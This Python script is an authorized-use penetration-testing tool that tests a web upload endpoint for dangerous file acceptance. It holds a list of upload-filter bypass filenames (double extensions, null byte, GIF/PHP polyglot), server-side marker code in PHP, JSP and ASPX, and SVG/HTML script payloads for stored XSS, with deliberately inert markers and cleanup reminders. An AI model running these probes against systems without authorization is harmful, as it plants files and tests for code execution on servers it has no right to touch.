#!/usr/bin/env python3
"""upload_probe.py — owned malicious-file-upload DETECTION for pen_test.

Tests an upload endpoint's validation with benign-marker files (never a working
webshell) and proves impact with a three-part differential:

  1. ACCEPTED   — a normally-forbidden extension/type/content passes validation
                  (compared against a control `.exe` that SHOULD be rejected).
  2. RETRIEVABLE— the probe locates the stored file (response URL, or a guess-list
                  of common upload dirs) and fetches it back.
  3. EXECUTED / DANGEROUSLY-SERVED — the fetched file returns the COMPUTED marker
                  (`PROBE_MARKER_49_...`, proving interpreter execution) rather
                  than raw source; OR an SVG/HTML is served with a browser-
                  renderable Content-Type and no attachment disposition (stored XSS).

Acceptance alone is only informational — never reported as RCE without (2)+(3).
Every payload is inert (echoes a computed token / pings a fixed OOB host); no OS
commands, no input-taking shell. Records each upload's URL/token for cleanup.

AUTHORIZATION: active traffic — authorized targets only.

Usage:
    python3 upload_probe.py -u "https://app/upload" --field avatar --evidence-dir ./ev
    python3 upload_probe.py -u "https://app/upload" --field file \\
        --form "csrf=abc" --dirs "/uploads/,/media/" --oob-host abc.oob.example
"""

from __future__ import annotations

import argparse
import random
import re
import string
from urllib.parse import urljoin, urlparse

import _httpcore as core

TOKEN = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
MARK = f"PROBE_MARKER_49_{TOKEN}"        # 41+8 == 49, so execution yields this exact string
XSS_MARK = f"PROBE_XSS_{TOKEN}"

PHP_BODY = f'<?php echo "PROBE_MARKER_".(41+8)."_{TOKEN}"; ?>'.encode()
JSP_BODY = f'<% out.println("PROBE_MARKER_" + (41+8) + "_{TOKEN}"); %>'.encode()
ASP_BODY = f'<% Response.Write("PROBE_MARKER_" & (41+8) & "_{TOKEN}") %>'.encode()
GIF_PHP = f'GIF89a<?php echo "PROBE_MARKER_".(41+8)."_{TOKEN}"; __halt_compiler();?>'.encode()
SVG_XSS = (f'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
           f'<script>document.title="{XSS_MARK}";</script><text>{MARK}</text></svg>').encode()
HTML_XSS = f'<!doctype html><html><body><script>document.title="{XSS_MARK}"</script>{MARK}</body></html>'.encode()

# (filename, content-type, bytes, kind)  — kind drives the success check
MATRIX = [
    ("probe.php", "image/png", PHP_BODY, "exec"),
    ("probe.php5", "image/png", PHP_BODY, "exec"),
    ("probe.phtml", "image/jpeg", PHP_BODY, "exec"),
    ("probe.pht", "application/octet-stream", PHP_BODY, "exec"),
    ("probe.php.jpg", "image/jpeg", PHP_BODY, "exec"),
    ("probe.jpg.php", "image/jpeg", PHP_BODY, "exec"),
    ("probe.PhP", "image/png", PHP_BODY, "exec"),
    ("probe.php%00.jpg", "image/png", PHP_BODY, "exec"),
    ("probe.gif", "image/gif", GIF_PHP, "exec"),          # polyglot magic bytes
    ("probe.jsp", "image/png", JSP_BODY, "exec"),
    ("probe.aspx", "image/png", ASP_BODY, "exec"),
    ("probe.svg", "image/svg+xml", SVG_XSS, "xss"),
    ("probe.html", "text/html", HTML_XSS, "xss"),
]
CONTROL = ("probe_control.exe", "application/octet-stream", b"MZ\x90\x00control", "control")
GUESS_DIRS = ["/uploads/", "/upload/", "/files/", "/media/", "/static/uploads/",
              "/user_uploads/", "/avatars/", "/attachments/", "/wp-content/uploads/",
              "/storage/", "/public/uploads/"]
REJECT_HINTS = re.compile(r"invalid|not allowed|forbidden|only .* (images|files)|bad (type|extension)"
                          r"|unsupported|rejected|error", re.I)
URL_IN_RESP = re.compile(r'https?://[^\s"\'<>]+|/[\w./-]+\.(?:php|jsp|aspx?|svg|html?|gif|png|jpe?g)', re.I)


def _upload(client, url, field, filename, ctype, body, form):
    files = {field: (filename, body, ctype)}
    return client.request("POST", url, data=form or None, files=files, allow_redirects=True)


def _accepted(r, control_r) -> bool:
    if not r.ok:
        return False
    ok_status = r.status in (200, 201, 202, 204, 302)
    no_reject = not REJECT_HINTS.search(r.text[:2000])
    # the control (.exe) should be rejected; if everything "succeeds" identically it's not a signal
    control_rejected = (not control_r.ok) or control_r.status >= 400 or REJECT_HINTS.search(control_r.text[:2000] or "")
    return ok_status and no_reject and bool(control_rejected)


def _locate(client, upload_resp, base_url, filename) -> tuple[str, "core.Result"] | None:
    # 1) URL echoed in the response
    for m in URL_IN_RESP.findall(upload_resp.text or ""):
        cand = m if m.startswith("http") else urljoin(base_url, m)
        r = client.request("GET", cand, allow_redirects=True)
        if r.ok and r.status == 200:
            return cand, r
    # 2) guess-list of common dirs + filename (and null-stripped variant)
    root = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    names = {filename, filename.replace("%00", ""), filename.split("/")[-1]}
    for d in GUESS_DIRS:
        for nm in names:
            cand = urljoin(root, d + nm)
            r = client.request("GET", cand)
            if r.ok and r.status == 200 and r.length > 0:
                return cand, r
    return None


def _verdict(kind, fetched: "core.Result"):
    """Return (severity, status_word, proof) or None."""
    body = fetched.text or ""
    if MARK in body and b"<?php".decode() not in body and "out.println" not in body:
        return ("critical", "EXECUTED",
                f"uploaded server-side code executed: fetched file returned the COMPUTED marker "
                f"{MARK!r} (not raw source) — confirmed code execution.")
    if kind == "xss":
        ct = {k.lower(): v for k, v in fetched.headers.items()}
        ctype = ct.get("content-type", "")
        disp = ct.get("content-disposition", "")
        nosniff = ct.get("x-content-type-options", "").lower() == "nosniff"
        renderable = ("svg" in ctype or "html" in ctype) and "attachment" not in disp.lower()
        if renderable and not nosniff and XSS_MARK in body:
            return ("high", "STORED-XSS",
                    f"file served inline as {ctype!r} (no attachment/nosniff) with the XSS marker "
                    f"present — browser-renderable stored XSS.")
    if b"<?php".decode() in body or "out.println" in body:
        return ("low", "SERVED-AS-SOURCE",
                "dangerous file accepted and retrievable but served as raw source (not executed) "
                "— information exposure / misconfig, not RCE.")
    return None


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True, help="the upload endpoint")
    p.add_argument("--field", default="file", help="multipart form field name for the file")
    p.add_argument("--form", action="append", default=[], metavar="k=v",
                   help="extra form fields (repeatable), e.g. csrf token")
    p.add_argument("--dirs", help="comma-separated extra dirs to search for the stored file")
    p.add_argument("--oob-host", help="(reserved) collaborator host for SVG/XML XXE-on-parse")
    core.add_common_args(p)
    core.add_evidence_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)

    client = core.client_from_args(args)
    ev = core.evidence_from_args(args)
    form = core.parse_kv(args.form, "=") if args.form else {}
    if args.dirs:
        GUESS_DIRS[:0] = [d if d.endswith("/") else d + "/" for d in args.dirs.split(",")]
    print(f"Target upload: POST {args.url}  field={args.field!r}  marker={TOKEN}")

    # control: a .exe should be rejected — establishes the acceptance differential
    control_r = _upload(client, args.url, args.field, *CONTROL[:3], form)
    print(f"[control] {CONTROL[0]} -> status={control_r.status} "
          f"{'(rejected, good baseline)' if not _accepted_control(control_r) else '(ACCEPTED — weak differential)'}")

    accepted, findings = [], []
    for filename, ctype, body, kind in MATRIX:
        r = _upload(client, args.url, args.field, filename, ctype, body, form)
        if not _accepted(r, control_r):
            print(f"  [x] {filename:22s} ({ctype}) rejected/failed ({r.status})")
            continue
        print(f"  [+] {filename:22s} ({ctype}) ACCEPTED ({r.status}) — locating...")
        accepted.append(filename)
        loc = _locate(client, r, args.url, filename)
        if not loc:
            print(f"      accepted but not retrievable — informational only")
            continue
        cand_url, fetched = loc
        verdict = _verdict(kind, fetched)
        if not verdict:
            print(f"      retrieved {cand_url} but no execution/XSS signal")
            continue
        sev, word, proof = verdict
        print(f"      [!] {word} at {cand_url}")
        findings.append((sev, word, filename, ctype, cand_url, proof, fetched))

    print("\n" + "=" * 60)
    if not findings:
        if accepted:
            print(f"[~] {len(accepted)} dangerous file(s) ACCEPTED but none confirmed "
                  f"executed/served-dangerously: {', '.join(accepted)}. Informational — verify manually.")
        else:
            print("[-] No dangerous file accepted (validation held for the tested vectors).")
        # still emit an informational finding if acceptance-only, but with no 'proof' -> quarantined
        if ev and accepted:
            ev.add(core.Finding(
                vuln_class="file-upload", tool="upload_probe.py",
                title=f"Dangerous file type accepted by {urlparse(args.url).path}",
                severity="medium", target=args.url, status="candidate",
                proof="", request=f"POST {args.url} (multipart, field {args.field})",
                reproduce=f"python3 upload_probe.py -u '{args.url}' --field {args.field}",
                notes=f"Accepted (not proven exploitable): {', '.join(accepted)}. "
                      f"Locate + fetch to confirm execution before reporting."))
            print(f"[evidence] informational candidate written (quarantined until proof attached)")
        return

    for sev, word, filename, ctype, cand_url, proof, fetched in findings:
        print(f"[!] {sev.upper()} — {word} — {filename} ({ctype}) -> {cand_url}")
        if ev:
            excerpt = (fetched.text or "")[:200].replace("\n", " ")
            ev.add(core.Finding(
                vuln_class="file-upload", tool="upload_probe.py",
                title=f"Malicious file upload ({word}) via {filename}",
                severity=sev, target=args.url, status="confirmed",
                param=args.field, location="multipart", proof=proof,
                request=f"POST {args.url} field={args.field} filename={filename} Content-Type={ctype}",
                response_excerpt=excerpt,
                reproduce=f"python3 upload_probe.py -u '{args.url}' --field {args.field}",
                notes=f"Retrievable at {cand_url}. Benign marker only — CLEAN UP this file. "
                      f"Weaponization (input-taking webshell) intentionally not performed."))
    if ev:
        print(f"[evidence] {len(findings)} finding(s) written to {ev.findings_path}")
    print("    Remember to delete the uploaded marker files (see each finding's URL).")


def _accepted_control(control_r) -> bool:
    return control_r.ok and control_r.status in (200, 201, 202, 204, 302) \
        and not REJECT_HINTS.search(control_r.text[:2000] or "")


if __name__ == "__main__":
    main()
